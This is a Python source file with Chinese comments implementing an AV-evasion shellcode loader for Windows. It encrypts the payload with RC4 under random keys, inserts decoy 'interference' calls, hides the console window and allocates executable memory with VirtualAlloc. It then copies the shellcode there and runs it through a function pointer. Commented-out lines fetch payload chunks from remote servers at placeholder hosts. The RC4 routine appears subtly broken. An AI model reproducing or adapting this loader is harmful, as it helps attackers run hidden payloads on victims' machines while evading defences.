from ctypes import *
import ctypes
import sys, os, hashlib, time, base64
import random, string
import requests
import time


# 获取随机字符串函数，减少特征
def GenPassword(length):
    numOfNum = random.randint(1, length - 1)
    numOfLetter = length - numOfNum
    slcNum = [random.choice(string.digits) for i in range(numOfNum)]
    slcLetter = [random.choice(string.ascii_letters) for i in range(numOfLetter)]
    slcChar = slcNum + slcLetter
    random.shuffle(slcChar)
    getPwd = ''.join([i for i in slcChar])
    return getPwd


# rc4加解密函数，public_key（公钥）使用GenPassword函数，减少特征
def rc4(string, op='encode', public_key=GenPassword(7), expirytime=0):
    ckey_lenth = 4
    public_key = public_key and public_key or ''
    key = hashlib.md5(public_key).hexdigest()
    keya = hashlib.md5(key[0:16]).hexdigest()
    keyb = hashlib.md5(key[16:32]).hexdigest()
    keyc = ckey_lenth and (op == 'decode' and string[0:ckey_lenth] or hashlib.md5(str(time.time())).hexdigest()[
                                                                      32 - ckey_lenth:32]) or ''
    cryptkey = keya + hashlib.md5(keya + keyc).hexdigest()
    key_lenth = len(cryptkey)  # 64
    string = op == 'decode' and base64.b64decode(string[4:]) or '0000000000' + hashlib.md5(string + keyb).hexdigest()[
                                                                               0:16] + string
    string_lenth = len(string)
    result = ''
    box = list(range(256))
    randkey = []
    for i in xrange(255):
        randkey.append(ord(cryptkey[i % key_lenth]))
    for i in xrange(255):
        j = 0
        j = (j + box[i] + randkey[i]) % 256
        tmp = box[i]
        box[i] = box[j]
        box[j] = tmp
    for i in xrange(string_lenth):
        a = j = 0
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        tmp = box[a]
        box[a] = box[j]
        box[j] = tmp
        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
    if op == 'decode':
        if (result[0:10] == '0000000000' or int(result[0:10]) - int(time.time()) > 0) and result[10:26] == hashlib.md5(
                result[26:] + keyb).hexdigest()[0:16]:
            return result[26:]
        else:
            return None
    else:
        return keyc + base64.b64encode(result)


# 以下为shellcode loader代码

# shellcode字符串经过base64编码再经过hex编码分成三块，存放在某几个服务器上
# get请求方式得到经过编码的shellcode字符串
# res1 = requests.get("http://xxx.xxx.xxx/code/Shellcode1.TXT")
# res2 = requests.get("http://xxx.xxx.xxx/code/Shellcode2.TXT")
# res3 = requests.get("http://xxx.xxx.xxx/code/Shellcode3.TXT")
class Resp:
    def __init__(self, text):
        self.text = text


res1 = Resp('ZnF3ZmJ3Z')
res2 = Resp('WZncXdlZg')
res3 = Resp('==')
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
whnd = ctypes.windll.kernel32.GetConsoleWindow()

rcpw = GenPassword(13)

# 得到经过编码后的shellcode字符串后进行rc4加密，私钥通过GenPassword()函数得到
# 以此减少特码，达到内存中不暴露shellcode原始字符串
buf = rc4(base64.b64decode(res1.text + res2.text + res3.text).decode('hex'), 'encode', rcpw)
rc4(res2.text, 'encode', GenPassword(13))  # 干扰代码

if whnd != 0:
    if GenPassword(6) != GenPassword(7):  # 干扰代码
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)

# 解密shellcode
scode = bytearray(rc4(buf, 'decode', rcpw))
rc4(res2.text + res1.text, 'encode', GenPassword(13))  # 干扰代码

# 申请可读可写不可执行的内存
memHscode = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                ctypes.c_int(len(scode)),
                                                ctypes.c_int(0x3000),
                                                ctypes.c_int(0x40))
rc4(res1.text, 'encode', GenPassword(13))  # 干扰代码
buf = (ctypes.c_char * len(scode)).from_buffer(scode)
old = ctypes.c_long(1)

# 使用VirtualProtect将shellcode的内存区块设置为可执行，所谓的渐进式加载模式
VirtualProtect(memHscode, ctypes.c_int(len(scode)), 0x40, ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memHscode),
                                     buf,
                                     ctypes.c_int(len(scode)))
fuck = rc4(GenPassword(7), 'encode', GenPassword(13))  # 干扰代码
runcode = cast(memHscode, CFUNCTYPE(c_void_p))  # 创建 shellcode 的函数指针
fuck = rc4(GenPassword(7), 'encode', GenPassword(13))  # 干扰代码
runcode()  # 执行
